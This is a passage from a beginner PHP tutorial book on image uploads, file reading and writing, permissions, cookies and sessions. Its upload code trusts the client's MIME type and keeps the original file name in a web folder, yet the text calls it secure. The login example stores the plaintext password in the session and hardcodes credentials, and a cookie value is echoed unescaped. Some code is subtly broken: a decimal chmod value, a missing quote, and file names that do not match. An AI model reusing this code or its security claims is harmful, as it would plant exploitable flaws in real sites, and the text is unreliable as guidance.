In summary, although the GET method is simple to use and suitable for small quantities of non-sensitive data, it has significant limitations in terms of security, data size and handling of special characters. For sensitive or voluminous data, we recommend using the POST method.

# Chapter 8

# Images and files

 

 

Image and file manipulation is an essential component of modern web development. In this chapter, we'll focus on two main aspects: sending and displaying images and files, and managing these files on the server.

 

First, we'll explore the process of sending images and files from an HTML form to a PHP server. We'll see how to process this data on the server side, checking file types and sizes, then saving them on the server. Next, we'll look at how to display these images in a web page, using the appropriate HTML tags.

 

Next, we'll look at server-side file management. We'll look at common operations such as creating, reading, writing and deleting files. We'll see how to manipulate directories, list files and other file management operations.

 

This chapter will take you on a deep dive into image and file manipulation in PHP, giving you the knowledge and skills you need to effectively manage multimedia resources and files in your web applications.

 

 

## Sending and displaying images or files

The process of sending and displaying images or files using a form can be divided into several stages:

 

*   Creating the upload form: First, you need to create an HTML form that will allow the user to select and upload a file from their device to the server. You can use the <input> tag of type "file" to create a form field for selecting a file.

 

*   Form processing: Once the user submits the form, the file data is sent to the server. You then need to create PHP code to process this data. This code may be integrated into the same form script, or it may be in an independent PHP script. This code must check that the file has been sent correctly, that it respects the file size and type restrictions you've defined, and then save it on the server.

 

*   Displaying the image on a web page: Once the image has been sent and saved on the server, you can display it on a web page using HTML's <img> tag. You must specify the path to the image in the "src" attribute of the <img> tag.

 

### Send form creation

 

Here is a code example to illustrate the process:

 

In the index.php file, create the following form:

 

<!DOCTYPE html\> <html lang\="en">  
<head\>  
 <meta charset\="UTF-8">  
 <title\>Image submission form</title\>  
</head\>  
<body\>  
 <form action\="" method\="post" enctype\="multipart/form-data">  
 <label for\="file">Select an image to send:</label\>  
 <input type\="file" name\="file" id\="file" capture\="Select File">  
 <input type\="submit" value\="Send">  
 </form\>  
</body\> 

</html\>

 

This HTML form is used to allow users to send files, particularly images, to a web server.

 

<form action="" method="post" enctype="multipart/form-data">: This <form> tag defines the start of the form. The action attribute specifies the URL of the data processing script (in this case, empty to submit to the same page) and the method attribute specifies the HTTP method used to send the data, which in this case is "post". The **enctype** attribute defines the content type of the form, which is "multipart/form-data" when sending files.

 

Here is an overview of the form:

 

![Image](images/image-121.png)

 

In short, this form allows the user to select a file to send, then submit the form so that the file can be transferred to the server via the POST method with the "multipart/form-data" content type.

 

### Form processing

 

The next step involves the creation of a directory named "uploads" in your project structure, where uploaded images will be stored. Then, in the index.php file, just before the form, we integrate PHP code to manage the data transmitted via the form.

 

<?php  
 // Check that the file has been sent correctly  
 if ($\_SERVER\["REQUEST\_METHOD"\] == "POST" && isset($\_FILES\["file"\])){  
 

 $file \= $\_FILES\["file"\];  
  
 // Check if the file is a JPEG or PNG image  
 $allowed\_types \= \["image/jpeg", "image/png"\];

  
 if (in\_array($file\["type"\], $allowed\_types)) {  
 // Move file to destination directory on server  
 $destination \= "uploads/".$file\["name"\];  
 move\_uploaded\_file($file\["tmp\_name"\], $destination);  
 echo "The image has been uploaded successfully.";  
 } else {  
 echo "Error: Please select an image in JPEG or PNG format.";  
 }  
}

?>

 

This PHP code is used to check and process a file sent via an HTML form, in particular for uploading and saving images on the server.

 

*   The first line of code checks whether the request method is **POST** and whether the file has been sent to the $\_FILES superglobal with the key "file". "file" is the value of the form's "name" attribute.

 

*   Next, a $file variable is created and initialized with the downloaded file data, extracted from the $\_FILES superglobal.

 

*   A list of authorized image types is defined in an array named $allowed\_types, in this case "image/jpeg" and "image/png".

 

*   The in\_array() function is used to check whether the type of the downloaded file is one of the permitted types defined in the $allowed\_types array.

 

*   If this is the case, the file is moved from the temporary folder to a destination directory specified in the $destination variable using the **move\_uploaded\_file()** function. The temporary file is specified by **$\_FILES\["file"\]\["tmp\_name"\],** and the file name is kept unchanged in $file\["name"\].

 

*   If the file type is not authorized, an error message is displayed, instructing the user to select an image in JPEG or PNG format.

 

This code ensures that only JPEG or PNG files are accepted and uploaded to the server, guaranteeing data security and integrity.

 

To test your code, follow these simple steps: run the index.php file, select an image from your device, then validate the form. If the image you've selected complies with the specified permitted types, it will be saved in the "uploads" directory you created earlier.

 

![Image](images/image-122.png)

 

Please note, however, that the directory in which your files are stored must be writable and readable. Depending on your operating system, you may need to authorize read and write access to this directory.

 

### Image display in a web page

 

The third step is to display the image transmitted by the form. To do this, we create a file called display\_image.php :

 

<!DOCTYPE html\>  
<html lang\="en">  
<head\>  
<meta charset\="UTF-8">  
<title\>Image display</title\>  
</head\>  
<body\>  
 <h1\>Image sent:</h1\>  
  
 <!-- Display uploaded image -->  
 <?php

  
 $image\_path = "uploads/php.png"; // Path to image saved on server  
 echo '<img src=" ' . $image\_path . ' " width="960" alt="Image">';

  
 ?>  
</body\>  
</html\>

 

 

This HTML code with PHP tags is used to display an image on a web page.

*   **$image\_path = "uploads/php.png";** : Defines the path to the image saved on the server.
*   **echo '<img src=" ' . $image\_path . ' " width = 960 alt="Image" >';** : Displays the image using the <img> tag with src attributes to specify the image path, alt to provide alternative text for the image (useful for accessibility) and width to define its width in pixels.

 

![Image](images/image-123.png)

 

## File management

 

File management is an important part of web development with PHP, as it allows you to manipulate and interact with files on the server. This section will cover basic operations such as reading, writing, creating and deleting files.

 

### File playback

 

Using file\_get\_contents()

 

The file\_get\_contents() function reads the complete contents of a file into a string. This method is useful for small files whose contents can be stored in memory.

 

For example:

 

To begin, create a directory called "filetext" at the root of your "ebookphp" project. Inside this directory, save a text file named "poem1.txt" containing part of one of Shakspare's most famous poems.

Here are the contents of the "poem1.txt" file:

 

![Image](images/image-124.png)

 

In the index.php file, we put the code that will read the contents of the poem1.txt file:

 

<?php  
 // Read the contents of a file in a string  
 $content = file\_get\_contents('filetext/poem1.txt');  
  
 // Display the contents of the file  
 echo $content;  
?>

 

This PHP code reads the contents of a text file named "poem1.txt" located in the "filetext" directory ( This is one of Shakspare's most famous poems). The **file\_get\_contents()** function is used to read the contents of the file and store them in a variable called $content. The contents of the file are then displayed on screen using the **echo $content;** command.

 

Running index.php will produce the following result:

 

![Image](images/image-125.png)

 

The result shows that line breaks were not respected when displaying the contents of the "poeme.txt" file. To preserve line breaks when reading a file with file\_get\_contents(), you can use PHP's predefined **nl2br()** function to convert line breaks into HTML <br> tags. This allows line breaks to be displayed correctly in an HTML context.

 

Here's how you can modify your example to include the nl2br() function:

 

<?php  
 // Read the contents of a file in a string  
 $content \= file\_get\_contents('filetext/poem1.txt');  
  
 // Convert line breaks into HTML tags <br>  
 $content\_with\_br \= nl2br($content);  
  
 // Display file contents with line breaks preserved  
 echo $content\_with\_br;  
?>

 

With this modification, line breaks in the poeme.txt file will be correctly displayed in your HTML page.

 

![Image](images/image-126.png)

 

In a nutshell, the file\_get\_contents() function is used to read the contents of a file as a string in PHP. It's handy for extracting textual content from files such as text files, CSV files or even web pages. This function is simple to use and returns the complete contents of the file in a string, making it easy to manipulate in PHP code.

 

Using fopen(), fread() and fclose()

###  

For more controlled and efficient reading of larger files, the fopen(), fread() and fclose() functions can be used. fopen() opens the file, fread() reads a specified number of bytes from the file and fclose() closes the file after reading.

 

Here's how to use them to read the contents of a file:

**fopen()** : This function opens a file or URL and returns a file pointer. It takes two arguments: the name of the file to be opened and the opening mode (read, write, etc.). The syntax of this function is as follows:

 

![Image](images/image-127.png)

 

The opening mode specifies how the file is to be opened. Here are some common modes:

 

**"r"**: Opens the file in read-only mode. The file pointer is placed at the beginning of the file.

**"w"**: Opens the file in write-only mode. Deletes existing contents or creates a new file if the file does not exist. The file pointer is placed at the beginning of the file.

**"a"**: Opens the file in write-only mode. The file pointer is placed at the end of the file. If the file does not exist, try to create it.

**"r+"**: Opens the file for reading and writing. The file pointer is placed at the beginning of the file.

The fopen() function returns a file pointer which is used by other file manipulation functions such as fread(), fwrite(), etc. If the fopen() function fails, it returns FALSE. If the fopen() function fails, it returns FALSE.

 

Here's an example:

 

<?php

 

 $handle \= fopen("filetext/poem1.txt", "r");  
?>

 

After opening the file with the fopen() function, the next step is to read its contents. PHP offers several functions for this task, including the fread() function, the fgets() function and the fgetc() function. Each of these functions offers a different method for reading data from the open file.

 

**The fread() function:** reads a specific number of bytes from the file opened with fopen(). It takes two arguments: the file pointer returned by fopen() and the number of bytes to be read. However, if you wish to read the entire file, you can use the filesize() function, which returns the total size of the file. Simply provide the name of the file you wish to read.

 

<?php  
 $handle \= fopen("filetext/poem1.txt", "r");  
 $content \= fread($handle, filesize("filetext/poem1.txt"));  
 echo $content;  
?>

 

Execution of this code will open the poeme.txt file and allow read-only access to its entire contents.

 

![Image](images/image-128.png)

 

If you wish to read a specific number of bytes from the file contents, simply specify this number of bytes as the second argument to the fread() function. For example, the following code allows you to read only 50 bytes of this content.

 

<?php  
 $handle \= fopen("filetext/poem1.txt", "r");  
 $content \= fread($handle, 50);  
 echo $content;  
?>

 

Result:

 

![Image](images/image-129.png)

 

**The fgets() function:** reads an entire line from the file opened by fopen(). It takes as argument the file pointer returned by fopen(). This function reads the line up to the end-of-line character, usually a line feed or carriage return. It returns the line read as a string, including the end-of-line character. If it reaches the end of the file, it returns false. 

Example:

 

<?php  
 $handle \= fopen("filetext/poem1.txt", "r");  
 $content \= fgets($handle);  
 echo $content;  
?>

 

Result:

 

![Image](images/image-130.png)

 

**The fgetc() function:** reads one character at a time from the file opened by fopen(). It takes as argument the file pointer returned by fopen(). Each time fgetc() is called, it advances one character in the file and returns the character read as a string. If it reaches the end of the file, it returns false.

 

In the following example, the fgetc() function will be executed six times, displaying the first six characters of the file in question:

 

<?php  
 $handle \= fopen("filetext/poem1.txt", "r");  
 echo fgetc($handle);  
 echo fgetc($handle);  
 echo fgetc($handle);  
 echo fgetc($handle);  
 echo fgetc($handle);  
 echo fgetc($handle);  
?>

 

Result:

 

![Image](images/image-131.png)

 

To read the entire contents of a file using the fgetc() function, you can call it in a while loop until it returns false, indicating the end of the file.

 

Here is an example of the code:

 

<?php  
 $file = fopen("filetext/poem1.txt", "r");  
  
 if ($file) {  
 // Loop for reading character by character  
 while (($char = fgetc($file)) !== false) {  
 echo $char;  
 }  
 }  
?>

 

This PHP code opens the "poeme.txt" file in read mode using the fopen() function. If the file is opened successfully (i.e. if $file is not equal to false), then a while loop is initiated. At each iteration of the loop, the fgetc() function is used to read a character from the file. The loop condition checks whether the value returned by fgetc() is not false, meaning that there are still characters to read from the file. If so, the character is displayed using echo. This loop is repeated until the end of the file is reached, at which point the value returned by fgetc() becomes false, thus terminating the loop.

 

**The fclose() function**: is used to close a file that has been previously opened with the fopen() function. It takes as argument the file pointer returned by fopen().

 

Example of using fclose() :

 

  
<?php  
 $handle = fopen("filetext/poem1.txt", "r");  
  
 if ($handle) {  
 $content = fread($handle, filesize("filetext/poem1.txt"));  
 echo $content;  
 fclose($handle); // Close file  
 } else {  
 echo "Unable to open file";  
 }  
?>

 

This PHP code opens the file "poeme.txt" in read mode using the fopen() function. If the file is opened successfully, the file size is obtained using the filesize() function and the file contents are read into a variable using the fread() function. The contents are then displayed with echo.

 

After reading the file contents, the fclose() function is used to close the file and release the associated resources. If the file cannot be opened, an error message is displayed indicating that file opening has failed.

 

### File creation

 

Creating files in PHP is a common operation that can be easily performed using a few built-in functions. Here's how to create a new file :

 

Using the fopen() function

 

The first step in creating a file is to use the fopen() function. This function opens a file or creates one if it doesn't already exist. Here's an example:

 

 

<?php  
  
 // Open a file in write mode (create a new file if it doesn't exist)  
 $handle = fopen("filetext/new\_file.txt", "w");  
  
 // Check if the file has been opened successfully  
 if ($handle !== false) {  
 echo "The file has been created successfully!";  
 fclose($handle); // Close file after use  
 } else {  
 echo "Impossible to create the file";  
 }  
  
?>

 

In this example, we use fopen() to open a file named "nouveau\_fichier.txt" in write mode ("w"). If the file does not exist, fopen() will create it. If the file is opened successfully, a success message is displayed, otherwise an error message is displayed.

 

The fopen() function can also be used to open files in other modes, such as read-only ("r"), read/write ("r+"), append ("a") and so on.

This step is essential for creating a file before writing data to it.

If this code is executed without error, the message "The file has been created successfully" is displayed, and a new empty file named "nouveau\_fichier.txt" is created in the "filetext" directory.

![Image](images/image-132.png)

 

### Writing files

 

Writing to files in PHP is a common operation when it comes to generating data files, activity logs or reports. PHP offers several methods for writing to files, providing great flexibility to meet different development needs. In this section, we'll explore different ways of writing to files in PHP.

 

Using the fwrite() function

 

Once the file has been successfully opened, we can write data to it using the fwrite() function.

 

The fwrite() function in PHP is used to write data to a file. It generally takes three arguments: the file pointer (usually returned by the fopen() function), the string to be written to the file, and optionally the length of the string to be written. If the length is not specified, fwrite() will write the entire string supplied.

 

The fwrite() function returns the number of bytes written to the file, or FALSE on error. It is often used in conjunction with the fopen() function to open a file in write mode. Once the data has been written, we recommend closing the file using the fclose() function to free up system resources.

 

Here's an example of how to use fwrite() to write to a file:

 

 <?php 

 

 // Open a file in write mode  
 $file \= fopen("filetext/new\_file.txt", "w");  
  
 // Write a string to the file  
 $data \= "This is an example of content to be written to the file.";  
 fwrite($file, $data);  
  
 // Close the file  
 fclose($file);

 

 ?>  
 

 

In this example, the fopen() function opens the file named "nouveau\_fichier.txt" in write mode ("w"). Next, the fwrite() function writes the string stored in the $data variable to this file. Finally, the fclose() function closes the newly created file.

 

Using the file\_put\_contents() function

 

The **file\_put\_contents()** function in PHP is used to write data to a file. It takes as parameters the path of the file to write to, the data to be written, and possibly additional options.

 

Example of using file\_put\_contents() to write to a file :

 

<?php  
  
 // Data to be written to the file  
 $data = "Content to be written to the file.";  
  
 // Target file path  
 $filename = "filetext/new\_file.txt";  
  
 // Write data to file  
 file\_put\_contents($filename, $data);  
  
?>

 

This PHP code uses the file\_put\_contents() function to write data to a file. The $data variable stores the content to be written and the $filename variable stores the path of the target file to which the data will be written. The file\_put\_contents function is then called with the two variables $data and $filename as parameters. This function is useful because it simplifies writing data to a file to a single line of code.

Note that this function also takes care of file creation if the file does not exist, as well as handling write errors.

 

If you run this code successfully, you'll see that the text contained in the $data variable has replaced all the previous contents of the specified file. However, if you wish to keep the existing content and addition the new text afterwards, you have several options. In what follows, we're going to use a constant provided by PHP called **FILE\_APPEND**. This constant allows us to addition data to the end of the file, rather than overwriting it completely.

 

To use this constant, simply addition FILE\_APPEND as the third argument to the file\_put\_contents() function. This tells PHP to addition the new data to the end of the file, preserving the existing content.

 

Here's how you can modify the file\_put\_contents() function to use the FILE\_APPEND constant:

 

<?php  
 // Data to be written to the file  
 $data = "Content to be written to the file.";  
  
 // Target file path  
 $filename = "filetext/new\_file.txt";  
  
 // Write data to file  
 file\_put\_contents($filename, $data, FILE\_APPEND);  
?>

 

With this modification, new content will be added to the end of the file without overwriting existing data.

 

### Deleting files

 

File deletion in PHP can be performed using the unlink() function. This function takes the path of the file to be deleted as a parameter and returns true if the deletion was successful, otherwise it returns false.

 

Here's an example of how to use the **unlink()** function to delete a file:

 

<?php  
 // Path of the file to be deleted  
 $filename = "filetext/new\_file.txt";  
  
 // Delete the file  
 if (unlink($filename)) {  
 echo "The file has been deleted successfully.";  
 } else {  
 echo "Error: Unable to delete file.";  
 }  
?>

 

 

Result:

 

![Image](images/image-133.png)

 

In this example, the **unlink()** function is used to delete the file specified by the $filename path. If the deletion is successful, a message is displayed indicating that the file has been successfully deleted. Otherwise, an error message is displayed.

It is important to note that deleting files is a permanent and irreversible operation. It is therefore advisable to be careful when using the unlink() function to avoid accidentally deleting files.

###  

### Advanced file handling

 

Advanced file manipulation in PHP involves operations such as moving files, changing permissions, checking the existence of files and so on. This section will explore various PHP functions that enable you to perform these advanced file operations.

 

Moving files

 

Files can be moved in PHP using the **rename()** function. This function allows you to rename or move a file or folder to a new, specified location. Here's an example of how to use the rename() function to move a file: 

 

Let's create a new folder called "destination\_folder" at the root of our eBoophp project. In the "filetext" directory, we've already created a file named "poeme.txt". Next, we'll move this file to the new "destination\_folder" directory.

 

Please note, however, that the directory in which your files are stored must be writable and readable. Depending on your operating system, you may need to authorize read and write access to this directory.

 

<?php  
  
 // Source file path  
 $source = "filetext/poem1.txt";  
  
 // Destination path  
 $destination = "new\_folder/poem1.txt";  
  
 // Move file  
 if (rename($source, $destination)) {  
 echo "The file has been successfully moved";  
 } else {  
 echo "Error: Unable to move file.";  
 }  
  
?>

 

In this example, the rename() function is used to move the file specified by the $source path to the $destination path. If the move is successful, a message is displayed indicating that the file has been successfully moved. Otherwise, an error message is displayed. Note that you can assign a new name to the moved file.

 

Changing permissions

 

File permissions can be changed in PHP using the **chmod()** function. This function allows you to change the access permissions to a file by specifying the new rights in octal numbers. Each file has three sets of permissions, each for a different type of user: the file owner, the group associated with the file and other users. Each set of permissions is represented by a number.

 

![Image](images/image-134.png)

 

Examples:

 

7 (4 + 2 + 1): means the owner has read, write and execute permission.

6 (4 + 2): means that the owner has read and write permission, but not execute permission.

5 (4 + 1): means that the owner has read and execute permission, but not write permission.

 

So the number **641** grants the file owner read and write permission (6 = 4 + 2), the group only read permission (4) and others only execute permission (1).

 

Here's an example of how to use the **chmod()** function to change file permissions:

 

<?php  
 // File path  
 $filename \= "new\_folder/poem1.txt";  
  
 // New permissions (e.g. 0644 for read and write for owner, read for group and read for others)  
 $new\_permissions \= 754;  
  
 // Change file permissions  
 if (chmod($filename, $new\_permissions)) {  
 echo "File permissions have been successfully modified;  
 } else {  
 echo "Error: Unable to change file permissions";  
 }  
?>

 

In this example, the **chmod()** function is used to modify the permissions of the file specified by the $filename path, using the new permissions specified. If the modification is successful, a message is displayed indicating that the file permissions have been successfully modified. Otherwise, an error message is displayed. The value 754 specified in the $new\_permissions variable grants the owner all permissions (7 = 4+2+1), the user group read and execute permissions (5 = 4+1) and others only read permissions (4).

 

Note:

 

Make sure that the file you are trying to modify the permissions of actually exists at the specified location, and that the path is correct. If you are running this code locally on your machine, ensure that your user has the necessary permissions to modify the permissions of files in the specified directory.

 

File existence check

 

Checking the existence of files in PHP can be performed using the **file\_exists()** function. This function checks whether a file or directory exists at the specified location. Here's an example of how to use the file\_exists() function to check the existence of a file:

 

  
<?php  
 // File path  
 $filename = "new\_folder/poem1.txt";  
  
 // Check file existence  
 if (file\_exists($filename)) {  
 echo "The file exists";  
 } else {  
 echo "The file does not exist";  
 }  
  
?>

 

In this example, the file\_exists() function is used to check whether the file specified by the $filename path exists. If the file exists, a message indicating that the file exists is displayed. Otherwise, a message indicating that the file does not exist is displayed.

 

## Conclusion

In this chapter dedicated to image and file manipulation in PHP, we've taken a deep dive into the powerful features offered by this programming language. We've explored in detail the various steps involved in loading, displaying, reading and writing files, as well as advanced methods for moving and deleting them. By acquiring these essential skills, you are now armed to create dynamic, interactive web applications that fully exploit the potential of images and files. With your in-depth understanding of these concepts and your mastery of PHP tools, you're ready to take on the most demanding web development challenges.

 

# Chapter 9

# Session and cookie management

 

 

Sessions and cookies are essential elements in the development of interactive and dynamic web applications. They store and maintain information about the server and the client, making it easier to personalize the user experience and track browsing activities.

 

Sessions and cookies are widely used in web development for various functionalities, including:

 

**Authentication and authorization management**: sessions and cookies are used to maintain user login status and restrict access to certain parts of the site.

 

**Temporary data storage**: sessions are used to store temporary data needed to perform certain functions, such as shopping carts in online stores.

 

**Personalizing the user experience**: by storing user preferences such as language, theme, etc., cookies enable you to personalize your browsing experience.

 

**Tracking browsing activity**: cookies are used to collect data on users' interactions with the site, enabling us to analyze trends and personalize content.

 

In this chapter, we'll explore in detail the management of cookies and sessions in PHP, as well as the best practices and security considerations associated with their use.

 

 

## Cookie management

Cookies are small text files stored on users' computers by web browsers. They play an essential role in the operation and personalization of modern websites. Cookies enable websites to remember users' preferences, track their activity and provide a personalized experience.

 

In this section, we'll explore cookie management in PHP in detail, including the creation, reading, modification and deletion of cookies, as well as good security practices associated with the use of cookies in web development.

 

Generally speaking, the process of exchanging cookies between the web browser and the web server, stored on the client side, and accessed and manipulated on the server side for various functionalities can be summarized as follows:

 

1- The process begins when the web browser sends an HTTP request to the web server to access a page or perform a specific action. 2- The web server responds to this request by sending HTTP headers, including cookies, to the browser. Cookies are small pieces of data stored in the browser that make it possible to track and identify users as they interact with the site. 3- The browser stores these cookies on the client side, associating them with the domain and path specified by the server. 4- The web server sends an HTTP response to the browser, which may contain additional data to be displayed or processed. 5- When the browser sends new HTTP requests to the server (for example, to access other pages on the site), it automatically includes the cookies associated with the site's domain and path. 6- The server retrieves these server-side cookies using the $\_COOKIE superglobal in PHP, allowing them to be accessed and manipulated in the server-side script as required. 7- Cookies can be manipulated on the server side for various functionalities such as user authentication tracking, content personalization, preference tracking, etc. 8- With each subsequent request sent by the browser, the associated cookies are automatically included, enabling the server to continue using them to personalize the user's experience. 

 

The following illustration summarizes the cookie exchange process between the client's web browser and the web server:

 

![Image](images/image-135.png)

 

In short, cookies are used to store client-side information and transmit it to the server with each request, enabling the server to maintain application state and personalize the user experience.

 

### Creating and Sending Cookies

 

To create a cookie in PHP, use the **setcookie()** function. This function takes several parameters, including the cookie name, value, validity time (optional), path (optional) and domain (optional).

 

![Image](images/image-136.png)

 

**name**: the name of the cookie.

**value**: the value associated with the cookie.

**expire** : optional, specifies the cookie expiry date as a Unix timestamp. If not specified, the cookie will expire at the end of the session.

**path** : optional, specifies the path on the server for which the cookie is available. By default, it is available throughout the site.

**domain** : optional, specifies the domain for which the cookie is available. By default, it is available for the current domain.

**secure** : optional, specifies whether the cookie should be transmitted via HTTPS only. By default, it is set to false.

**httponly**: optional, specifies whether the cookie is accessible via HTTP only and not via JavaScript. By default, it is set to false.

 

A cookie can store various types of information, such as session identifiers, user preferences, language settings, tracking data and so on. Here's a practical example of what can be stored in a cookie:

 

Suppose a website allows the user to choose their favorite theme from a selection of themes. Once the user has chosen a theme, the site can store this information in a cookie so that the next time they visit the site, they will see the same theme they had previously selected.

 

Example of code to store the preferred theme in a cookie :

 

<?php  
 // Setting cookie name and value  
 $name = "user";  
 $theme\_value = "Alice Dupont";  
  
 // Set cookie lifetime (1 hour)  
 $expiration = time() + 3600; // current timestamp + 3600 seconds (1 hour)  
  
 // Set the path for which the cookie is valid (the whole site)  
 $path = "/";  
  
 // Set the domain for which the cookie is valid (current domain)  
 $domain = "";  
  
 // Create cookie with setcookie()  
 setcookie($name, $theme\_value, $expiration, $path, $domain);  
  
 // Display a confirmation message  
 echo "The cookie has been created successfully";  
?>

 

 

In this example :

 

*   The cookie name is set to "user" and its value to "Alice Dupont".
*   The cookie expires after 1 hour (3600 seconds) from the time it is created.
*   The path is defined as "/" to indicate that the cookie is valid throughout the site.
*   The domain is left empty, which means that the cookie is valid for the current domain.
*   Finally, the **setcookie()** function is used to create the cookie with the specified parameters.
*   After executing this code, a cookie named "user" with the value "Alice Dupont" will be created, valid for one hour.

 

Result:

 

![Image](images/image-137.png)

 

### Reading Cookies

 

Created cookies are automatically included in the **$\_COOKIE** superglobal. To read a cookie in PHP, you can use the $\_COOKIE superglobal. Here's how you can read an existing cookie:

 

<?php  
 // Check if the cookie exists  
 if(isset($\_COOKIE\["user"\])) {  
 // Retrieve the value of the "user" cookie  
 $user = $\_COOKIE\["user"\];  
 // Display the cookie value  
 echo "Hello, " . $user . "! You're back.";  
 } else {  
 // If the cookie doesn't exist, display a default message  
 echo "Welcome, unknown visitor!";  
 }  
?>

 

In this example :

 

We first check whether the "user" cookie exists using isset($\_COOKIE\["user"\]).

If the cookie exists, we retrieve its value using $\_COOKIE\["user"\] and assign it to the $user variable.

Next, we display a personalized welcome message using the cookie value, or a default message if the cookie doesn't exist.

 

The value of this approach lies in personalizing the user experience. By using cookies, a website can recognize previous visitors and offer them a personalized welcome, which can improve their experience on the site and enhance engagement. It can also make it easier to retain certain user preferences or login data, offering a smoother, more convenient experience on subsequent visits to the site.

 

Result:

 

![Image](images/image-138.png)

###  

### Modifying and Deleting Cookies

 

To modify an existing cookie, you can simply create a new cookie with the same name as the one you wish to modify. This will overwrite the old cookie with the new values specified. Just make sure you specify the same options as the original cookie, such as path and validity time, to avoid any inconsistencies.

 

If, for example, you wish to modify the "user" cookie previously created, you can proceed as follows:

 

<?php  
 setcookie('user', 'theme\_fonce', time() + 72000, '/');  
?>

 

This code modifies the existing user cookie by replacing its value with "theme\_fonce". The modified cookie will be valid for 72,000 seconds (20 hours) from the moment it is executed, and will be accessible from the domain root.

 

To delete a cookie, you can set its value to empty and specify an expiry date in the past. This tells the browser to delete the cookie. Again, make sure you specify the same options as the original cookie to ensure that the cookie is correctly deleted.

 

<?php  
 // Set an expiration date in the past to delete the cookie  
 setcookie('user', '', time() - 3600, '/');  
?>

 

In this example, we delete the user cookie by setting its value to an empty string and specifying an expiry date in the past. This will cause the cookie to expire immediately on the user's browser, deleting it permanently.

 

### Cookie security

 

It's important to note that cookies are stored client-side and can be modified by the user. Therefore, do not store sensitive information in cookies, and be sure to validate and clean all data before using them in your applications.

Cookie management is an essential aspect of modern web development, offering a convenient way of storing temporary information on the user's browser. However, it's crucial to understand their limitations and to use them securely to guarantee the integrity and confidentiality of your application's data.

 

## Session management

Sessions in PHP are an essential technique for maintaining the state of a web application between different HTTP requests. A session is a means of storing user-specific information while browsing a website, such as user authentication, shopping cart, user preferences, etc. Unlike cookies, session data is stored on the server, making it more secure as it is not exposed to the client.

 

### Session Management Process

The PHP session management process comprises the following steps:

 

**Session startup**: Before using sessions, you need to start a session by calling the session\_start() function. This function initializes a new session, or restores an existing one if it already exists.

 

**Storing data in the session**: Once a session has been started, you can store data in the session using the $\_SESSION associative array. Data stored in $\_SESSION is available for all pages of the website for the duration of the session.

 

**Accessing session data**: To access stored session data, simply use the $\_SESSION array with the appropriate key to access the corresponding value.

 

**Closing the session**: When you've finished working with the session, you can close it by calling the session\_destroy() function. This will destroy all existing session data.

 

Benefits of Sessions :

 

**Security**: Session data is stored on the server, making it more secure than client-side cookies.

**Persistence**: Session data remains available for the duration of the session, even if the user navigates between different pages of the site.

**Flexibility**: Sessions can store large amounts of data, making them ideal for managing sensitive or complex information.

 

### Practical example:

 

To better understand how sessions work, let's take the example of a website with a member area. Each user must log in to access this area, and it is essential to guarantee that a user remains identified throughout his or her session on the site.

 

To do this, we need to provide users with a login form:

Let's start by creating a new connetion.php file in which we put the following form:

 

<!DOCTYPE html\> <html lang\="en">  
<head\>  
<meta charset\="UTF-8">  
<meta name\="viewport" content\="width=device-width, initial-scale=1.0">  
<title\>Connect to member area</title\>  
</head\>  
<body\>  
<h2\>Connect to member area</h2\>  
<form action\="verification.php" method\="post">  
 <div\>  
 <label for\="username">Username:</label\>  
 <input type\="text" id\="username" name\="username">  
 </div\>  
 <br\>  
 <div\>  
 <label for\="password">Password:</label\>  
 <input type\="password" id\="password" name\="password">  
 </div\>  
 <div\>  
 <input type\="submit" value\="Login">  
 </div\>  
</form\>  
</body\>  
</html\>

 

 

 

This form sends the data entered by the user to a verification script named "verification.php" via the POST method. It contains two fields: one for the username ("text" type) and one for the password ("password" type).

The "verification.php" file will be responsible for verifying the information provided by the user to authorize or deny access to the member area. But for the purposes of this example, our aim is to explain how sessions work, so that data can be passed on from page to page.

 

To put our example into practice, we create a file named "verification.php" where we define a basic username and password for testing purposes. Ideally, in a real-life scenario, we would query a database to verify the authenticity of the information provided by the user.

###  

### Starting and storing session data

 

<?php  
 // Basic username and password for tests  
 $valid\_username = "toto";  
 $valid\_password = "azerty123";  
  
 // Check if form data has been sent  
 if (isset($\_POST\['username'\]) && isset($\_POST\['password'\])) {  
 // Check that username and password are correct  
 if ($valid\_username == $\_POST\['username'\] && $valid\_password == $\_POST\['password'\]) {  
 // Start session  
 session\_start();  
  
 // Save session parameters  
 $\_SESSION\['username'\] = $\_POST\['username'\];  
 $\_SESSION\['password'\] = $\_POST\['password'\];  
  
 // Display a welcome message and a link to the members' area  
 echo "Logged in as " . $\_SESSION\['username'\] . "<br />";  
 echo 'You can access the members\\' area: <a href="members.php">Link to members\\' page</a>';  
 } else {  
 // Error message if username or password is incorrect  
 echo 'Sorry, the username or password is incorrect.';  
 }  
 } else {  
 // Message if form data not sent  
 echo 'You need to go to the login page.';  
 }  
?>

 

Here is a detailed explanation of the code:

 

*   **Initializing variables :**

$valid\_username and $valid\_password are defined as the valid username and password for the connection. In a real-life context, these values would generally be checked against a database or other authentication system.

 

*   **Checking form data :**

The if condition (isset($\_POST\['username'\]) && isset($\_POST\['password'\])) checks whether the form data has been submitted via the POST method.

 

*   **Checking logins and passwords :**

If the form data has been submitted, the code checks whether the username and password correspond to the valid values defined previously. This is done with the condition if ($valid\_username == $\_POST\['username'\] && $password == $\_POST\['password'\]).

 

*   **Starting the session :**

 

If login and password are correct, a session is started with **session\_start()**. User information is then stored in session variables with $\_SESSION\['usernaame'\] and $\_SESSION\['password'\].

 

*   **Message display :**

 

If login and password are correct, a welcome message is displayed with the name of the logged-in user and a link to a members-only page.

 

![Image](images/image-139.png)

 

If the user IDs or passwords are incorrect, an error message is displayed to inform the user.

 

![Image](images/image-140.png)

 

*   **Error case management :**

 

If the form data is not submitted, a message is displayed telling the user to go to the login page.

This code shows a simple example of login and password verification and session management in PHP.

 

### Access to Session Data

 

In the members.php page, to which the user will be redirected once logged in, you should check that the user is logged in by verifying the presence of their session information. If the user is logged in, you can display members-only content.

 

Here is an example of what you could include in the members.php page:

 

<?php  
 session\_start();  
  
 // Check if user is logged in  
 if (isset($\_SESSION\['username'\]) && isset($\_SESSION\['password'\])) {  
 // Display members-only content  
 echo 'Welcome to the members\\' area, ' . $\_SESSION\['username'\] ;  
 echo '<br>';  
 echo 'Members-only content...<br />';  
 echo '<a href="logout.php">Log out</a>'; // link for disconnect  
 } else {  
 // Redirect user to login page if not logged in  
 header('Location: login.php');  
 exit();  
 }  
?>

 

This PHP code checks whether a user is logged in as a member. Here's how it works:

 

The first step is to start the session by calling the **session\_start()** function, which must be declared at the very beginning of your code. This enables access to stored session information.

 

Next, the code checks whether the user's session information exists by verifying the presence of the "username" and "password" keys in the $\_SESSION array. These keys contain the user's identification information, which was stored at the time of connection.

 

